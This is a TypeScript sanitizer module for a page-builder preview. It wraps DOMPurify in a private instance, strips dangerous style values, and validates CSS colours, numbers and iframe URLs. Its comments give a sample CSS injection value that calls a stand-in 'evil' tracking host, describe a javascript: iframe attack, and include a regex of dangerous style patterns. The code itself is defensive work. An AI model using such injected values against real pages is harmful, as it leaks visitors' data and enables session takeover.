/**
 * HTML sanitization for the page-builder Studio preview.
 *
 * BlockPreview renders the author's LIVE editor draft with `{@html}` before it
 * is ever round-tripped through the engine's server-side scrubber
 * (engine/sanitize.ts sanitizeBlocks). Without this, a `<script>` typed into a
 * rich-text/columns/html block would run in the admin's own session on preview.
 * Mirrors packages/studio/src/lib/sanitize.ts; kept as a sibling of
 * builder-types so the import survives the extension→studio sync unchanged.
 */

import DOMPurify from 'dompurify';

// Drop `style` values carrying an exfil/execution vector (url()/@import/etc.) —
// DOMPurify keeps safe-scheme url() otherwise. Matches the engine's per-property
// CSS validation. Registered once (hooks are global) in a DOM context.
const DANGEROUS_STYLE = /url\(|expression\(|@import|javascript:|\/\*/i;

/**
 * Our OWN DOMPurify, not the shared module singleton.
 *
 * `addHook` registers on the instance, and `import DOMPurify from 'dompurify'`
 * is ONE instance for the whole tab — `hooks` lives inside `createDOMPurify`'s
 * closure (purify.cjs.js:528). So the hook below ran for every caller in the
 * Studio bundle, including `content/pages/client/sanitize.ts`, which allows
 * `style` deliberately because a hero block carries
 * `style="background-image: url(/img/hero.jpg)"`.
 *
 * Opening the page builder therefore changed how the PUBLIC renderer treated
 * styles for the rest of the session — correct on a fresh load, wrong after
 * visiting the builder, correct again after a refresh.
 *
 * This is a preview of an author's own draft, so stripping `url()` here is
 * right; doing it to everything else in the tab is not. Calling the default
 * export as a function returns a fresh instance with its own hooks, built once
 * and cached because the factory re-derives its configuration from the window on
 * every call.
 */
let _purify: ReturnType<typeof DOMPurify> | null = null;
function purifier(): ReturnType<typeof DOMPurify> {
  if (_purify) return _purify;
  const instance = DOMPurify(window);
  instance.addHook('uponSanitizeAttribute', (_node, data) => {
    if (data.attrName === 'style' && DANGEROUS_STYLE.test(data.attrValue)) {
      data.keepAttr = false;
    }
  });
  _purify = instance;
  return instance;
}

const ALLOWED_TAGS = [
  'a',
  'b',
  'i',
  'em',
  'strong',
  'u',
  's',
  'br',
  'p',
  'span',
  'div',
  'ul',
  'ol',
  'li',
  'blockquote',
  'code',
  'pre',
  'h1',
  'h2',
  'h3',
  'h4',
  'h5',
  'h6',
  'img',
  'figure',
  'figcaption',
  'table',
  'thead',
  'tbody',
  'tr',
  'th',
  'td',
  'hr',
];

const ALLOWED_ATTRS = [
  'href',
  'src',
  'alt',
  'title',
  'target',
  'rel',
  'class',
  'style',
  'colspan',
  'rowspan',
];

/** Sanitize untrusted HTML before handing it to `{@html ...}`. */
export function safeHtml(html: unknown): string {
  if (typeof html !== 'string' || html.length === 0) return '';
  if (typeof window === 'undefined') return html.replace(/<[^>]*>/g, '');
  return purifier().sanitize(html, {
    ALLOWED_TAGS,
    ALLOWED_ATTR: ALLOWED_ATTRS,
    ADD_ATTR: ['rel'],
    ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|tel:|#|\/)/i,
  });
}

const CSS_COLOR_RE = /^(?:#[0-9a-f]{3,8}|rgba?\([^)]{0,80}\)|hsla?\([^)]{0,80}\)|[a-z]{3,20})$/i;

/**
 * Validate a user-supplied CSS colour before splicing it into an inline
 * `style="..."` attribute.
 *
 * Svelte escapes the value for HTML, but not for CSS — inside `style` the
 * grammar is CSS, and `;` starts a new declaration. So a block author writing
 * `red; background-image: url(https://evil/track?id=1)` gets a tracking pixel
 * that fires the moment an admin opens the preview, leaking their IP and the
 * fact they viewed it. Anything that is not recognisably a colour is replaced
 * by the caller's fallback.
 */
export function safeCssColor(value: unknown, fallback: string): string {
  if (typeof value !== 'string') return fallback;
  const trimmed = value.trim();
  if (trimmed.length === 0 || trimmed.length > 100) return fallback;
  return CSS_COLOR_RE.test(trimmed) ? trimmed : fallback;
}

/** Clamp a user-supplied number used in a style attribute, so it cannot carry CSS. */
export function safeCssNumber(value: unknown, fallback: number, min: number, max: number): number {
  const n = typeof value === 'number' ? value : Number.parseFloat(String(value ?? ''));
  if (!Number.isFinite(n)) return fallback;
  return Math.min(max, Math.max(min, n));
}

/**
 * Restrict an `<iframe src>` to http(s).
 *
 * The embed block lets an author type a URL. Without this, `javascript:...`
 * runs in the admin's origin the moment the preview renders — an editor-to-admin
 * session takeover from a field that looks like a text input.
 */
export function safeIframeSrc(url: unknown): string {
  if (typeof url !== 'string' || url.length === 0) return 'about:blank';
  const trimmed = url.trim();
  if (/^https?:\/\//i.test(trimmed)) return trimmed;
  if (/^\/\//.test(trimmed)) return `https:${trimmed}`;
  return 'about:blank';
}
